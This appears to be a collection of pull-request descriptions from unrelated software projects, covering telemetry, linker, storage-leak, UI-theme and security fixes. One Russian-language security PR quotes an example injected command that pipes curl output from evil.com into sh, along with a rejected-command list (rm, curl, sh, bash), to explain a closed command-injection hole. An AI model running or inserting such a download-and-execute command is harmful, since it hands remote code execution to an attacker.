body:
## Summary

`XybridModel::warmup` opens `execute:<model>` + `llm_inference` spans via the executor before publishing a `ModelWarmup` event. Two gates in `crates/xybrid-sdk/src/telemetry.rs` decide whether an event triggers the span-snapshot + collector-reset path:

- `snapshot_spans_into_event` at the SDK publish boundary
- `convert_to_platform_event` at the SDK→wire conversion

Both listed `PipelineComplete`, `ModelComplete`, `LocalAborted`, `CloudRetry` — but NOT `ModelWarmup` (added in a prior PR). One-list-entry change in each gate fixes both symptoms.

## Symptoms (both fixed by this change)

| # | What the user sees | Why |
|---|---|---|
| 1 | Warmup row's trace detail renders the **synthesized placeholder** flamegraph (POST /v1/chat, auth · validate key, cache · lookup, …) instead of the real `execute:<model>` + `llm_inference` spans | `snapshot_spans_into_event` skipped on `ModelWarmup` → warmup's spans never embedded → dashboard falls back to `buildSpansFor` placeholder |
| 2 | First chat turn after warmup shows **3 spans on its trace detail**: 2 stray `execute:<model>` + `llm_inference` it didn't generate, plus its own real `llm_inference_streaming_with_messages` | Collector never reset on warmup publish → warmup's spans stay live → next event's snapshot captures them |

Both surfaced on a real REPL session — warmup row had a 7-span synthesized fallback; chat turn 1 had 3 spans (2 leaked + 1 real); chat turns 2 + 3 had 1 span (correct, because chat turn 1's snapshot drained the collector).

## Test plan

- [x] New `xybrid_model_warmup_drains_span_collector_to_avoid_leak_into_next_event` asserts the observable consequence: `core_tracing::get_stages_json()["spans"]` is empty after `model.warmup()` returns
- [x] Existing `xybrid_model_warmup_emits_one_model_warmup_event` + `xybrid_model_run_streaming_emits_one_model_complete_event` still pass
- [x] `cargo test -p xybrid-sdk --features platform-macos --test telemetry_integration` — 13 pass, 1 ignored
- [x] `cargo test -p xybrid-sdk --features platform-macos --lib` — 333 pass
- [x] `cargo clippy --workspace --tests --benches --features platform-macos -- -D warnings` — clean
- [ ] On-device verify: re-run CLI REPL streaming → warmup row should render a real flamegraph (no "synthesized" tag); chat turn rows should only show their own spans

## Notes

- The two match lists at telemetry.rs:1010-1013 and telemetry.rs:2268-2271 must always agree — the comment block at convert_to_platform_event already warned about this. Both updated symmetrically.
- This is the cleanup follow-up to the `ModelWarmup` event type itself (introduced via the warmup-folding work).

author: thiagoralves
body:
## Summary
v0.4.15 split the runtime debug header but left the `extern` forward declarations behind in `debug_dispatch.hpp`. `generated_debug.cpp` (which now includes only `debug_table.hpp`) defines `const Entry* const debug_arrays[N] = {…}` at namespace scope — C++ default linkage for a `const` namespace variable is INTERNAL, so the definitions stopped being externally visible. Linker then bailed in every consumer translation unit (the simulator's ModbusSlave, runtime v4 entry shim, etc.):

```
/work/src/debug_dispatch.hpp:198: undefined reference to `strucpp::debug::debug_array_count'
/work/src/debug_dispatch.hpp:202: undefined reference to `strucpp::debug::debug_array_counts'
/work/src/debug_dispatch.hpp:207: undefined reference to `strucpp::debug::debug_arrays'
```

Fix: move the `extern` declarations into `debug_table.hpp`. Forward-declaring with `extern` before the `const` definitions forces external linkage, and consumers that include `debug_dispatch.hpp` get the decls transitively through it.

## Test plan
- [x] strucpp test suite: 1965 passed (unchanged)
- [x] End-to-end PID compile **with link** (the regression that escaped v0.4.15):
  - Local strucpp source → strucpp.compile() on a PID-bearing program
  - Assemble firmware skeleton (editor's `resources/sources/Baremetal/` + `arduino/`)
  - arduino-cli compile for `arduino:avr:mega` with editor's exact flags
  - **Sketch uses 8914 bytes (3%) program storage / 682 bytes RAM** — links cleanly
- [ ] Downstream: bump openplc-editor + openplc-web `binary-versions.json` to v0.4.16.

## Why this escaped v0.4.15
The previous verifier `-c`-compiled `generated_debug.cpp` to an object file but never linked. C++ linkage rules around `const` namespace-scope are exactly the kind of bug that only surfaces at link time. The new harness runs the full arduino-cli compile (which includes the link step) on a PID-using project — this class of regression now gets caught locally before release.

author: iscasasola
body:
## Why · owner-reported 2026-05-24

> *"if we have an event and we added them to list or locked them. when I create a new event, there should be no traces of whatever we locked from the other event. i remember experiencing this. like on the comparing list."*

## Audit findings

Walked every `localStorage` / `sessionStorage` key in `apps/web`. **One real cross-event leak found:**

| File | Storage key | Scope | Status |
|---|---|---|---|
| `pair-target-picker.tsx` | `'setnayan_principal_pair_target'` | **GLOBAL** | ❌ **LEAK — this PR** |
| `auto-preload-on-event-day.tsx` | `${prefix}${eventId}` | per-event | ✅ correct |
| `theme-provider.tsx` | `'theme'` | account-level pref | ✅ correct |
| `sidebar-resize-handle.tsx` | `'setnayan:dashboard-sidebar-width'` | account-level pref | ✅ correct |
| `guest-guided-tour.tsx` | `${prefix}${tourKey}` | per-tour | ✅ correct |
| `_AnnouncementBar.tsx` · `demo-mode-banner-client.tsx` | dismiss flags | session-level | ✅ correct |

**Also audited (no leak):**
- All `event_vendors` queries on event-home page.tsx have `.eq('event_id', eventId)` — no DB leak
- Wizard vendor-pick `CompareState` is in-memory `useState` — fresh on every page mount
- Marketplace `/vendors/compare` is URL `?ids=` state (gated to V1.2 anyway)
- Your Plan `plan-card-compare` reads picks prop from server-fetched `event_vendors`

The owner remembered the leak as "compare list" but the actual source was **PairTargetPicker** — it wrote the principal-sponsor pair count to a GLOBAL localStorage key. Host who picked "8 pairs" on Event A saw Event B's picker pre-fill to 8 instead of the default 4 on first visit.

## Fix (+18 / -5 · 2 files)

1. **`pair-target-picker.tsx`**
   - `STORAGE_KEY` global → `storageKeyFor(eventId)` returning `'setnayan:principal_pair_target:' + eventId`
   - New `eventId: string` prop
   - Matches the proven pattern from `auto-preload-on-event-day.tsx` (`'${STORAGE_KEY_PREFIX}${eventId}'`)

2. **`sponsors/page.tsx`**
   - Pass `eventId={eventId}` to `<PairTargetPicker>` (eventId already in scope from params)

Old global key stays orphaned in users' browsers but never reads (silent try/catch). Harmless. New per-event keys populate on first interaction.

No schema change. No new dependencies. No new orphans.

author: nyh
body:
We're planning to start implementing arithmetic operators even if not completely (e.g., the subset used for #10568 - add to CQL UPDATE the ability to calculate the new value).

One of the things we need to understand before doing this is what some of these operators do on the "decimal" type, because there are questions what needs to be done regarding the precision of the output of these operators - we need to answer both mundane quotes (how many digits should 1.0 / 3.0 have?) to more serious OOM concerns like SCYLLADB-1576.

In this patch we add extensive tests that verify exactly how Cassandra behaves for arithmetic operators on the "decimal" type. Cassandra's current behavior was introduced in 2019, in commit d60e798 (fixing CASSANDRA-15232), and it makes sense that when we'll implement operators in Scylla (issue #2693), we'll choose the same limitations and logic as Cassandra did, instead of inventing a different one. Or if we do decide to implement different behavior, we'll still want to know where we differ from Cassandra.

This patch also improves the existing test for excessive precision in the "sum" aggregation. It turns out that Cassandra has the same bug (CASSANDRA-21401) - they fixed the unlimited-precision bug of operators but not aggregations - but to reproduce it we need to use a more reasonable precision (500 million instead of one billion). The improved test "does its stuff" (i.e., fails badly due to the bug) on both Scylla and Cassandra.

Refs #2693 ("support arithmetic operators")

body:
## Summary

Fixes #27138: when a project contains a subdirectory with its own `v.mod`, importing a submodule like `import dep.mymod` from the outer project failed with `unknown enum dep.mymod.Color (type_idx=0)` and `unknown function: dep.mymod.color_name`. The dependency's `.v` files were parsed but registered under the wrong qualified name (`mymod` instead of `dep.mymod`), because the inner `v.mod` was treated as the naming boundary in `util.qualify_module`.

The fix anchors `mod_path_to_full_name` to the v.mod that contains the current compilation (`pref.path`). When the resolved module directory lies inside that project root, the module name is computed relative to it, so a nested v.mod no longer shrinks names of its sub-modules. The existing standalone case (\`cd dep && v .\`) is preserved — it's covered by `test_running_project_from_its_own_vmod_with_parent_vmod_works_issue_26828`, which still passes.

body:
## Summary

Implements **SP1** of gap feature #3 (built-in browser pane). Full agent-browser parity is decomposed into sub-projects; this lands the foundation:

- **Core**: new `SurfaceKind { Terminal, Browser { url } }` on `Surface` (serde-default `Terminal`, so old sessions load unchanged). `WorkspaceModel::open_browser` (splits the focused surface into a browser leaf) and `set_surface_url`. URL → pane title via a credential-stripping, authority-only helper.
- **Events**: `events.subscribe` stream now carries surface kind on `SurfaceAdded` and emits `SurfaceUrlChanged` (edge-triggered) so subscribers can follow navigation.
- **Socket**: `browser.open {workspace_id, url, axis?}` and `browser.navigate {surface_id, url}` verbs (added to `METHODS`; drift test covers them). Bare domains get `https://` prepended; URLs capped at 8 KiB.
- **GTK** (behind opt-in `browser` cargo feature → pulls `webkit6` 0.5 / WebKitGTK6): `BrowserPaneWidget` = address bar (entry + back/forward/reload) over a `WebView`. `gtk_app` renders a browser leaf by surface kind, reusing the live webview per surface id. Navigation is edge-triggered on the *last-requested* url (not the committed URI) so user clicks aren't reset and there's no reload loop. Builds without the feature render a placeholder, keeping the model consistent. `forktty-core`/`forktty-socket` stay webkit-free.
- **CLI**: `forktty browser open [--workspace-id <id>] [--axis ...] <url>` and `forktty browser navigate [<surface-id>] <url>`.

Socket nav is pure model-state (the GTK side observes the url diff and calls `load_uri`), so SP1 needs no new socket→GTK command channel. Socket-driven back/reload and the scripting verbs (snapshot/click/fill/eval) are deferred to SP2; cookie/profile import to SP3.

Spec: `docs/superpowers/specs/2026-05-24-browser-pane-sp1-design.md` · Plan: `docs/superpowers/plans/2026-05-24-browser-pane-sp1.md`

## User-visible behavior changes

- **New CLI commands**: `forktty browser open [--workspace-id <id>] [--axis ...] <url>` and `forktty browser navigate [<surface-id>] <url>` for opening and controlling browser panes within the TUI
- **New socket verbs**: `browser.open` and `browser.navigate` JSON-RPC methods for scriptable browser pane control

body: ## Bug and impact Saving a replacement photo reused `HabitPhotos/{habitID}/{date}.jpg` before SwiftData committed the updated `HabitEntry`. If the model save failed, rollback cleanup removed that shared path, deleting the previously good photo while the database still pointed at it. The Home wallet path also upserted/deleted by scanning `habit.entries`, which could create duplicate entries or delete only one duplicate row. ## Root cause Photo file writes were not transactional with SwiftData saves, and entry resolution logic differed across Home, Calendar, and Carousel. ## Fix - Write each photo save to a unique `{date}-{UUID}.jpg` path. - Centralize photo entry fetch/upsert/delete/dedupe in `HabitEntryPersistence`. - Remove superseded photo files only after SwiftData save succeeds; remove the new file and rollback the context on save failure. - Delete all entries for a habit/date from wallet delete, not just the first relationship match. - Use the same photo-entry selection logic across wallet, carousel, calendar card, and calendar grid. - Add regression tests for duplicate photo selection and unique filenames. ## Validation - `git diff --check HEAD~2 HEAD` - `node scripts/token-audit.js` (0 errors, 0 warnings) - Swift/Xcode tests were not run because this Linux environment does not have `swift` or `xcodebuild` installed.

body: ### Summary (non-technical, complete) Prevent mmexternal helpers from hanging action workers when a helper trickles an incomplete response or when one-way mode ignores helper output. ### References Refs: N/A ### Notes (optional) Bug and impact: recent mmexternal timeout/one-way behavior could still stall production pipelines. A helper sending partial bytes before each timeout could hold the worker indefinitely, and a one-way helper writing stdout/stderr could fill an unread pipe and block before consuming more input. Root cause: `responseTimeout` was applied independently to each `poll()` call rather than to the complete LF-framed response, and `interface.output="none"` still wired child stdout/stderr to a pipe that the parent never drained. Fix: use one absolute response deadline for each helper reply, redirect ignored helper stdout/stderr to `/dev/null`, and add regressions for trickled partial replies plus stderr-heavy one-way helpers. author: ibazylchuk
body:
## Summary

Replaces the recently-shipped `path_prefixes` heuristic on `arch_context` with an explicit `project` field carried on every architectural memory card. The caller passes the same project name the indexer uses in code-chunk `payload.project` — no inference from file paths, no derived state.

This is a **breaking change**: `path_prefixes` is removed, `arch_record_component` now requires `project`, and old component cards without `project` are invisible to project-scoped queries (no migration — rewrite them).

## What changed

- **Write API:**
  - `arch_record_component(group, project, …)` — `project` required. Idempotency is per `(group, project, name)`, so two projects in the same group may legitimately reuse a component name like `indexer`.
  - `arch_record_decision(group, project?, …)` — optional.
  - `arch_record_lesson(group, project?, …)` — optional.
- **Read API:**
  - `arch_context(question, group?, project?, min_score?)` — `project` replaces `path_prefixes`. Components filter hard on `project=X`; decisions and lessons filter soft (`project=X` OR no `project` field) so globally-scoped guidance still surfaces.
- **Similarity gate scoped to project (catches Codex finding #1):**
  - `findNearest` now considers only cards visible to the write's project: same project plus group-wide cards. A duplicate decision in app-b no longer blocks an app-a write; a duplicate lesson in app-b no longer gets its `updatedAt` bumped by an app-a write. A global write is correspondingly only blocked by other globals.
- **`findByName` scoped by project**, so `upsertComponent` no longer cross-overwrites a same-named component in another project of the same group.
- **`init_arch_memory` workflow + archSchema resource (catches Codex finding #2):**
  - `init_arch_memory.args.project` is now `required: true`. The message threads `project` through every `arch_record_component` example so following the built-in workflow doesn't trip the new Zod schema.
  - `archSchema` resource body documents project scoping, marks `project` required for components and optional for decisions/lessons, and notes the gate is now project-scoped.

## Implementation notes

- Project filtering is post-fetch in `searchWithVector` (Qdrant can't express "hard for components, soft for non-components" cleanly in one filter). When `project` is set the underlying limit is overfetched 3×; if the filter still leaves fewer than `limit` hits, the short list is returned with a single Qdrant call — no recursive top-up.
- `findNearest` does the same post-filter with overfetch of 10 hits.

## Test plan

- [x] `yarn workspace @paparats/server test` — 515/515 (includes new tests for project payload, name-isolation by project, cross-project gate isolation for both decisions and lessons, global-write not blocked by project-scoped near-match, and `init_arch_memory.args.project.required === true`).
- [x] `yarn typecheck`, `yarn lint`, `yarn prettier:check` — all clean.
- [ ] Manual smoke after merge: re-record this repo's components with `project='paparats-mcp'`, then call `arch_context` with that project and confirm only matching components surface.

author: alyrae0
body:
## Problem

After updating hermes-agent, the `/status` command returns raw i18n keys instead of translated strings:

```
gateway.status.header
gateway.status.session_id
gateway.status.title
gateway.status.created
gateway.status.last_activity
gateway.status.tokens
gateway.status.agent_running
gateway.status.platforms
```

## Root Cause

The `t()` function in `agent/i18n.py` resolves locale YAML files from
`locales/` relative to the repo root.  The Nix package copies
`skills/`, `plugins/`, and `web_dist/` to `share/hermes-agent/`,
but **not** `locales/`.  Without the YAML files, `t()` falls back to
returning the raw key string.

## Fix

| File | Change |
|---|---|
| `nix/hermes-agent.nix` | Copy `locales/` to `share/hermes-agent/locales`; set `HERMES_LOCALES` env var |
| `agent/i18n.py` | `_locales_dir()` checks `HERMES_LOCALES` env var first, falls back to repo-relative path |

This mirrors the pattern already used for `HERMES_BUNDLED_SKILLS` and
`HERMES_BUNDLED_PLUGINS`.

---

### Release Notes

<details>
<summary>pnpm/pnpm (pnpm)</summary>

### [`v11.3.0`](https://redirect.github.com/pnpm/pnpm/blob/HEAD/pnpm/CHANGELOG.md#1130)

[Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v11.2.2...v11.3.0)

##### Minor Changes

- Added `pnpm stage` with `publish`, `list`, `view`, `approve`, `reject`, and `download` subcommands for npm staged publishing.
- Added a new setting `trustLockfile`. When `true`, `pnpm install` skips the supply-chain verification pass that re-applies `minimumReleaseAge` / `trustPolicy='no-downgrade'` to every entry in the loaded lockfile. The install treats the lockfile as already-trusted — useful for closed-source projects where every commit comes from a trusted author. Defaults to `false`; verification stays on by default. Set in `pnpm-workspace.yaml`.

  Also cut the memory footprint of the verification pass itself: the per-(registry, name) trust-meta cache previously retained the full packument — dependency graphs, scripts, README, and per-version manifests — for the entire install. On large workspaces (`~4k` lockfile entries with `minimumReleaseAge` + `trustPolicy: no-downgrade` enabled) this could OOM CI runners with a 2GB heap cap. The cache now stores only the fields the trust check actually reads (`time`, per-version `_npmUser.trustedPublisher`, `dist.attestations.provenance`). The abbreviated-metadata cache is similarly projected to just the package-level `modified` field and the set of currently-listed version names. Fixes [#​11860](https://redirect.github.com/pnpm/pnpm/issues/11860).
- Implemented `pnpm pkg` command natively, following `npm pkg` standards.
- Implemented `pnpm repo` command natively, following `npm repo` standards.
- Implemented `pnpm set-script` (alias `ss`) natively. Adds or updates an entry in the `scripts` field of the project manifest, supporting `package.json`, `package.json5`, and `package.yaml` formats.
- Add a `skip-manifest-obfuscation` option for `pnpm pack` and `pnpm publish`. When enabled, the original `packageManager` field and publish lifecycle scripts are kept in the packed/published manifest instead of being stripped. The pnpm-specific `pnpm` field continues to be omitted.

##### Patch Changes

- Fixed `pnpm dlx` failing with `ERR_PNPM_NO_IMPORTER_MANIFEST_FOUND` when the installed package's CAS slot is missing its `package.json`. Observed in the wild for `pnpm dlx node@runtime:<version>` when the GVS slot was populated without the synthesized manifest runtime archives need (they don't ship a `package.json` of their own, so the synthesized one is the only way it gets there; an existing slot from an earlier code path that skipped the synthesis stays incomplete). The bin link itself is wired up from the resolution and remains valid, so `dlx` now falls back to the scopeless package name when the slot's manifest is unreadable — for single-bin packages (the dlx common case, including every `runtime:` spec) this matches what `manifest.bin` would have named. Multi-bin packages already require `--package=<spec> <bin>` to disambiguate and don't enter this code path.
- Fixed non-determinism in `pnpm dedupe` and `pnpm install` when a dependency graph contains packages with transitive peer dependencies on each other (e.g. `@aws-sdk/client-sts` and `@aws-sdk/client-sso-oidc`) and `auto-install-peers` is enabled. The lockfile no longer flips between two equally-valid forms across consecutive runs. The root cause was that `resolveDependencies` pushed onto its `pkgAddresses` / `postponedResolutionsQueue` arrays from inside `Promise.all`-spawned callbacks, so completion-order timing leaked into the array order and downstream cyclic-peer suffix assignment. Fixes [#​8155](https://redirect.github.com/pnpm/pnpm/issues/8155).
- Fixed a regression introduced by [#​11711](https://redirect.github.com/pnpm/pnpm/pull/11711) where `pnpm add <github-shorthand>` (and any other wanted-dependency whose alias can't be parsed from the user-supplied spec, e.g. tarball URLs or `pnpm/test-git-fetch#sha`) was silently dropped from the manifest update and from `pendingBuilds`. The alias-keyed lookup added in that PR couldn't find a `wantedDependency` whose `alias` was `undefined` at parse time but resolved to a package name only after fetching, so the entry never made it into `specsToUpsert`. Restored the original index-based pairing between `directDependencies` and `wantedDependencies`; the catalog-protocol preservation that PR was originally fixing is unaffected because it's driven by `rdd.catalogLookup.userSpecifiedBareSpecifier`, not by the lookup. Fixes the three `rebuilds dependencies` / `rebuilds specific dependencies` / `rebuild with pending option` failures in `building/commands/test/build/index.ts`.
- Fixed `pnpm add --config` leaving orphan entries in `pnpm-lock.env.yaml` (the optional subdependencies of the previously resolved version of the updated config dependency).

</details>

body:
## Description

Implements the **Autonomous Background Entity Simulation (ABES)** engine from Issue #13. The world now keeps running while players are offline: NPCs pursue long-term goals (travel, trade, raids, rest, scouting, etc.), and significant outcomes are logged as `world_delta` events for the GM Director to weave into catch-up narratives.

## Type of Change

- [x] New feature (non-breaking change that adds functionality)

## Related Issues

Closes #13

## What was delivered

### `db/migrations/016_abes.sql`
Three new tables:
- **`npc_long_term_intents`** — active NPC background goals (`travel`, `trade`, `recruit`, `scout`, `repair`, `raid`, `rest`, `negotiate`, `smuggle`)
- **`world_delta`** — significant event log with `severity` (minor/major/critical), indexed for fast catch-up queries
- **`abes_config`** — per-campaign settings: `enabled`, `tick_interval_min` (5–1440), `time_dilation` (0.1–100.0), `webhook_url`, `last_tick_at`

### `orchestrator/services/abes_service.py`
`WorldTickService` class with full lifecycle:
- `start()` / `stop()` — asyncio background task management
- `tick_all_campaigns()` — sweeps all enabled campaigns, respects per-campaign `tick_interval_min`
- `tick_campaign(campaign_id, time_dilation, webhook_url)` — resolves all active NPC intents for one campaign
- `_process_npc_intent()` — **pure Python math, no LLM**: advances `elapsed_ticks`, rolls hazard die via `secrets.randbelow()`, drains HP on complication, marks complete at 100%
- `_persist_event()` — writes `world_delta` rows
- `_fire_discord_webhook()` — embeds for critical/major events, **fails silently** (never interrupts tick loop)
- `get_recent_events(campaign_id, since)` — catch-up query for GMDirector narrative injection
- `upsert_npc_intent()` — register new NPC background goals

### `orchestrator/tests/test_abes.py`
13 pytest-asyncio unit tests covering: normal tick, complication/HP drain, NPC death, task completion, raid severity, DB persistence, webhook firing, webhook failure resilience, empty campaign, catch-up queries, intent registration, and time_dilation acceleration.

### `docs/issue-13-solution.md`
Full architecture diagram, schema reference, tick resolution algorithm, wiring instructions.

## Testing

- [x] Unit tests written (`orchestrator/tests/test_abes.py` — 13 tests)
- [x] All DB writes use parameterised queries (no injection vectors)
- [x] Webhook failure is non-fatal (tested explicitly)
- [x] LLM is never invoked during tick processing

## Code Quality

- [x] Follows existing service patterns (`downtime.py`, `prophetic_buffer.py`)
- [x] Uses `secrets.randbelow()` for cryptographically uniform RNG
- [x] No debug code or console logs left behind
- [x] `abes_config` rows auto-created via `INSERT … ON CONFLICT DO UPDATE`

## Documentation

- [x] `docs/issue-13-solution.md` added

## Planning Agent Sign-Off

- [x] Issue triaged: TIER 3 enhancement, no blockers
- [x] Approach: pure-math tick engine, no LLM, Discord webhook for critical events
- [x] Migration numbered `016` (safely above branches 014/015 not yet merged to main)
- [x] High-conflict files: none — all new files except migration

## Checklist

- [x] Self-reviewed
- [x] Tests added
- [x] No new warnings introduced
- [x] Follows `asyncpg` pool patterns from `downtime.py`

## Breaking Changes

- None — all new tables and a new service. Nothing existing is modified.

## Deployment Notes

1. Run `db/migrations/016_abes.sql` on PostgreSQL before deploying
2. Wire `WorldTickService` into `orchestrator/main.py` lifespan (see `docs/issue-13-solution.md`)
3. Optionally set `webhook_url` in `abes_config` per campaign for Discord push notifications

## Bug and impact
Custom encounter areas were dropped whenever the app restored a full state snapshot, including JSON import/save switching through `replaceState` and history sync through `syncStateFromHistory`. A user with custom areas in an exported/imported run would lose those locations because the reducer reset to `[]`; older affected states also surfaced this as `REPLACE_STATE` reducer errors while switching or deleting saves.

The `customAreas` reducer read `replaceWith.areas` and `syncWith.areas`, but the persisted/app state key is `customAreas`.

Read `customAreas` from restored state snapshots while keeping the existing `UPDATE_CUSTOM_AREAS` action payload unchanged.

body:
## Problema

O CI estava falhando em todas as PRs por 3 motivos:

### 1. Erros de TypeScript nos testes

- `afterEach(() => vi.restoreAllMocks())` — retorna `VitestUtils` mas `afterEach` espera `Awaitable<void>`
- `afterEach(() => vi.clearAllMocks())` — mesmo problema
- `proc.kill = vi.fn(...)` — `Mock<[signal?], boolean>` incompatível com `Mock<any[], unknown>`

### 2. `PrimitiveValue.vue` — `as` inline em template

`vue-tsc` não aceita type assertions com objeto literal (`as { value: boolean }`) dentro de `{{ }}`. Solução: mover para computed props no `<script setup>`.

### 3. ESLint não instalado no CI

O step de Lint rodava `npx eslint` que baixava ESLint v10 (flat config), mas o projeto não tem `eslint.config.*`. Eslint também não é dependência do projeto. Step removido.

## Solução

- Corrigidos os 3 erros de TypeScript nos arquivos de teste
- Refatorado `PrimitiveValue.vue` para usar computed props em vez de type assertions no template
- Removido step de Lint do CI (ESLint não configurado no projeto)
- Atualizado Node.js de 20 → 22 (v20 deprecated em junho/2026)

## Verificação local

```
npm run typecheck  → ✅ 0 erros
npm run test       → ✅ 84 testes passando (11 suites)
```

body:
## Summary

Settings panel grows an **Appearance** card at the top with a segmented Light / Dark / System theme picker, and the existing API integration sections (App Store Connect, Apple Search Ads) become **collapsible cards** with a green checkmark on the Connected status. The whole app picks up a **light theme** (dark stays the default).

## Demo

Dark stays the default; switch to Light from Settings → Appearance. `System` follows the OS live via `prefers-color-scheme` (test it by toggling macOS appearance — the page flips without you touching anything).

## What changed

**New: theme infrastructure**
- [`web/src/lib/theme.ts`](web/src/lib/theme.ts) — localStorage-backed `Theme` store (`light`/`dark`/`system`), idempotent `matchMedia` listener for live OS-preference following.
- [`web/src/components/ThemePicker.svelte`](web/src/components/ThemePicker.svelte) — controlled segmented picker with sun/moon/laptop SVG icons.
- [`web/index.html`](web/index.html) — inline `<script>` in `<head>` applies the saved theme class **before first paint** (module scripts can't avoid FOUC because they're deferred).
- [`web/src/main.ts`](web/src/main.ts) — calls `initTheme()` before `mount` for runtime listener setup.
- [`web/src/app.css`](web/src/app.css) — light scrollbar by default, dark scoped via `html.dark`.

**Settings panel UX**
- New **Appearance** card at the top.
- ASC and ASA sections wrapped in **collapsible cards** with a clickable header (chevron + title + status badge).
- Smart default: auto-opens on load when not yet configured; collapsed when Connected.
- `transition:slide` (200ms) on expand/collapse; `aria-expanded` + `aria-controls` wired in for screen readers.
- Green checkmark SVG next to the "Connected" status label.

**Component sweep — 20 .svelte files**

Existing dark-only color classes paired with light-mode counterparts using Tailwind's `dark:` variant (`darkMode: 'class'` was already configured but never used). Mapping recipe:

| Dark-only | Paired form |
|---|---|
| `bg-zinc-950` | `bg-white dark:bg-zinc-950` |
| `bg-zinc-900/800/700` | `bg-zinc-50/100/200 dark:bg-zinc-900/800/700` |
| `text-zinc-100/200/300/400` | `text-zinc-900/800/700/600 dark:text-zinc-100/200/300/400` |
| `text-zinc-500` | unchanged (middle gray reads on both) |
| Accent `text-emerald/amber/red/blue-400` | deepened to -600 in light mode for contrast |
| Inverted emphasis (`bg-zinc-100`, `text-zinc-950`) | flipped pair-wise |

## UI fixes surfaced during the migration

| Symptom | Fix |
|---|---|
| Dashboard unread-chart badge (`bg-amber-500`) had near-white text in light mode | Kept `text-zinc-950` in both modes — yellow needs dark text |
| Country combobox `✓` checkmarks had same yellow-contrast bug | Same fix |
| Chart notifications banner body (`text-blue-200`) invisible on `bg-blue-50` | Paired with `text-blue-700` |
| "Back to Keywords" + AddAppModal submit buttons disappeared on hover in light mode (`hover:bg-white` on light bg) | Mirrored to `hover:bg-black dark:hover:bg-white` |
| `DotsIndicator` empty dots (`bg-zinc-700`) looked like filled dark dots on white | Paired with `bg-zinc-300` for the figure/ground recede |

## Verification

- `npm run check` — 0 errors / 0 warnings across 146 files
- Manual: switched between Light / Dark / System; flipped OS preference while on System and the page followed; hard-reloaded on Light → no FOUC; hovered every CTA in both modes
- Toggle the API section cards open/closed; auto-open on first load when Not connected

## Relationship to #7

[#7](https://github.com/bootuz/keywordista/pull/7) (the ASA docs-link copy edit) was branched off the same `main` and is still open. The two PRs both touch `SettingsPanel.svelte` but at different lines:
- #7 touches the ASA help-text paragraph
- This PR restructures the *containers* around that paragraph but doesn't modify its content

Whichever merges first, the other rebases cleanly. (I verified by stashing this work onto fresh `main` and getting only a one-line content overlap on the `<code>` element, which I kept aligned with main's text.)

author: tsergeytovarov
body:
## TL;DR

Закрывает оставшиеся Medium из security review (#5 + #6 + #8).

## Что изменилось

**#5 — ccusage subprocess hardening**
- Валидация `commandPrefix[0]`: allowlist `{npx, bunx}` ИЛИ абсолютный путь (с запретом \`..\` внутри). Закрывает arbitrary command execution через подмену \`~/.config/ai-stats/config.json\` — раньше там можно было прописать \`[\"curl\", \"evil.com\", \"|\", \"sh\"]\` и оно бы запустилось каждые 15 минут.
- \`extraSearchPaths\` больше не включает \`~/.bun/bin\` (home-writable, PATH-hijack-вектор). Bun-юзеры добавляют bun в shell PATH — env прокидывается child'у через \`enrichedEnvironment\`, работать будет.

**#6 — `NSLog` → `os.Logger` с privacy-маркерами**
- Новый \`Shared/Util/AppLogger.swift\` с категоризованными loggers (sync, github, aiuse, ccusage, db, pricing, widget). Единый subsystem \`tech.popovs.aistats\` → фильтрация через \`log show --predicate 'category==\"aiuse\"'\`.
- Все 14 NSLog заменены. Privacy: response bodies / repo nameWithOwner / friend_code / paths с home / error.localizedDescription → \`.private\` (видны как \`<private>\` в Console.app). Identifier'ы (period, source, model SKU) → \`.public\` для удобства дебага.
- NSLog раньше писал ВСЁ plain-text в unified log macOS — Console.app, sysdiagnose, crash reports собирают это. Утекали: response bodies от GitHub/aiuse, имена приватных репов, friend_code.

**#8 — DB-import validation + rollback**
- Новый \`DatabaseValidator\` (pure-функция): SQLite magic header (16 байт) → open read-only → \`PRAGMA integrity_check\` → проверка наличия требуемых таблиц (\`ai_usage\`, \`github_activity\`, \`sync_state\`).
- В \`DatabaseImporter\` валидация ДО confirm-диалога: невалидный файл — alert, оригинальная БД не трогается.
- Исправлен existing bug: backup делался, но оригинал удалялся ДО copyItem импортируемого файла — если copy падал, юзер оставался без БД. Теперь оборачиваем copy в try/catch с rollback из backup'а.

## Как тестировал

\`xcodebuild test\` — 187/187 зелёные (170 baseline + 17 новых).

17 новых тестов:
- \`CcusageEnvTests\` (+8) — accept npx/bunx/absolute path, reject rm/curl/sh/bash, reject empty, reject \`..\` в любой форме, регрессия на \`extraSearchPaths\` без home-relative.
- \`DatabaseValidatorTests\` (9) — accept fresh migrated DB, reject текстового файла / random binary / truncated, reject nonexistent, reject SQLite без наших таблиц, reject partial schema, isolation тесты на validateMagicHeader.

## Чек-лист

- [x] Тесты проходят (187/187)
- [x] Changelog — секция "Security pass #3" в Unreleased
- [x] Атомарные коммиты: 4 (по одному на fix + docs)
- [x] Файлы по коммитам disjoint — никакого revert-дансинга

## Что остаётся из security review

- Low #9 (sandbox + hardened runtime), #12 (App Group для widget snapshot) — к v1.0, требует подписи.
- Low #13 (backup rotation), #14 (DELETE body → query param) — гигиена.
- Low #10 (cert pinning) — acceptable to skip.

После этого пасса все High и Medium из review закрыты.

## Agent

## Track
CI/refactor: poor man's merge queue for serial, tested PR landing without requiring every PR branch to be current with `main`.

## Invariant
When a PR is ready to land, the repository should test `latest main + PR head` exactly once in a serialized queue before merging; this preserves integration safety without requiring every PR author or agent to repeatedly merge `main` into their branch.

## Scope
- Add `scripts/ci/poor-mans-merge-queue.mjs` to select one auto-merge PR, create a synthetic merge branch, wait for required checks on that branch, post `Queue Tested` to the PR head, and merge only if `main` and the PR head are unchanged.
- Add `.github/workflows/poor-mans-merge-queue.yml` with single-concurrency queue execution and status invalidation on PR/main changes.
- Teach `ci.yml` to run on `automation/merge-queue/**` synthetic branches.
- Make the old `Refresh Green PRs` workflow manual-only so it does not fight the queue.
- Add unit coverage for queue selection/status/reporting logic.

- Row: n/a

- Evidence: workflow/script-only change; no compiler, benchmark row, or project-corpus semantics changed.

